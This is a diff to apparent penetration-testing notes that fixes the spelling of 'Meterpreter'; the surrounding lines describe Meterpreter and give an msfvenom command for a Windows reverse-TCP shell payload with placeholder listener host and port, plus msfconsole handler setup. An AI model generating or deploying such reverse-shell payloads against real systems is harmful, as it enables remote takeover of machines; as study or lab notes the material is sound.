@@ -6,7 +6,7 @@ IIS - Internet Information Services, is an extensible web server software create
 
 DLL - Dynamic-link library is Microsoft's implementation of the shared library concept in the Microsoft Windows and OS/2 operating systems. These libraries usually have the file extension DLL, OCX (for libraris containing ActiveX controls), or DRV (for legacy system drivers). The file formats for DLLs are the same as for Windows EXE files - that is, Portable Executable (PE) for 32-bit and 64-bit Windows, and New Executable (NE) for 16-bit Windows. As with EXEs, DLLs can contain coded, data and resources, in any combination.
 
-Meterpeter - Meterpeter is a Metaploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code.
+Meterpreter - Meterpreter is a Metaploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code.
 Meterpeter is deployed using in-memory DLL injection. As a result, Meterpeter resides entirely in memory and writes nothing to disk.
 
 ```
@@ -38,7 +38,7 @@ sc - command to use service control.
 ```
 ## Reverse shell using ftp
 ```
-msfvenom -p windows/meterpeter/reverse_tcp LHOST=x.x.x.x LPORT=X -f (file type) -o (file name)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=X -f (file type) -o (file name)
 ---
 After we see that we get a shell we can go to msfconsole and write use exploite/multi/handler.
 When we are in the exploit we need to set the payload with the next command ---> set payload windows/meterpeter/reverse_tcp (the payload is the same as we used earlier.
